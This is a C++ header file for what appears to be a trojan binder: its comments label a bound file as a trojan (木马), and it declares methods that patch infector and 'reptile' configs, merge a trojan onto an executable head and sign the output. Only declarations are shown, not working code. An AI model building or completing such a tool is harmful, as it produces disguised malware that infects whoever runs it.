#pragma once

enum ERR_COMPRESS_CODE
{
	ERR_GENERATE_OK = 0,
	ERR_GENERATE_LEAKFILE,
	ERR_GENERATE_REPLACECONFIG,
	ERR_GENERATE_EXEHEAD,
	ERR_GENERATE_BINDFILE,	
	ERR_GENERATE_SIGN,
};


#ifndef SAFE_CLOSE_FILE
#define SAFE_CLOSE_FILE(p) {if (INVALID_HANDLE_VALUE != p) {CloseHandle(p); p = INVALID_HANDLE_VALUE;}}
#endif

#ifndef SAFE_DELETE
#define SAFE_DELETE(p) {if (NULL != p) {delete p; p = NULL;}}
#endif

#ifndef SAFE_DELARRAY
#define SAFE_DELARRAY(p) {if (NULL != p) {delete[] p; p = NULL;}}
#endif

#ifndef SAFE_CLOSE_FILEHANDLE
#define SAFE_CLOSE_FILEHANDLE(handle)	{if(handle != INVALID_HANDLE_VALUE) {CloseHandle(handle);handle = INVALID_HANDLE_VALUE;}};
#endif


typedef struct MY_IMAGE_DOS_HEADER
{
	WORD   e_magic;                     // Magic number
	WORD   e_cblp;                      // Bytes on last page of file
	WORD   e_cp;                        // Pages in file
	WORD   e_crlc;                      // Relocations
	WORD   e_cparhdr;                   // Size of header in paragraphs
	WORD   e_minalloc;                  // Minimum extra paragraphs needed
	WORD   e_maxalloc;                  // Maximum extra paragraphs needed
	WORD   e_ss;                        // Initial (relative) SS value
	WORD   e_sp;                        // Initial SP value
	WORD   e_csum;                      // Checksum
	WORD   e_ip;                        // Initial IP value
	WORD   e_cs;                        // Initial (relative) CS value
	WORD   e_lfarlc;                    // File address of relocation table
	WORD   e_ovno;                      // Overlay number
	WORD   e_res[4];                    // Reserved words
	WORD   e_oemid;                     // OEM identifier (for e_oeminfo)
	WORD   e_oeminfo;                   // OEM information; e_oemid specific
	DWORD  selfFileSize;				        //捆绑头文件的大小
	DWORD  trojanFileSize;				      //第一个捆绑文件的大小(木马)
	DWORD  trojanAlignSize;				        //对齐木马新增尾部的大小
	WORD   e_res2[4];                   // Reserved words
	LONG   e_lfanew;                    // File address of new exe header
} MY_DOS_HEADER, *PMY_DOS_HEADER;


class CGenUTransmission
{
public:
	CGenUTransmission(void);
	~CGenUTransmission(void);
	int Generate(LPSTR lpReptile, LPSTR lpInject, LPSTR lpStrOutPut);

private:
	
	BOOL ReplaceConfigReptile(LPCTSTR strFileSrc, LPCTSTR strFileDes);
	BOOL ReplaceConfigInfect(LPCTSTR strFileSrc, LPCTSTR strFileDes);

	BOOL GenerateExeBindFile(LPCTSTR strExeHead, LPCTSTR strMumaFile, LPCTSTR strOutputFile);
	BOOL GenerateLastFile(LPCTSTR strExeBind, LPCTSTR strMumaFile, LPCTSTR strOutputFile);
	BOOL MergeFile(LPCTSTR strFileHead, LPCTSTR strFileEnd, LPCTSTR strOutputFile);
	BOOL SingFile(LPCTSTR strFileName);

private:
	CString m_strOutput;
	CString m_strExt;
	char m_szToolPath[MAX_PATH];
};
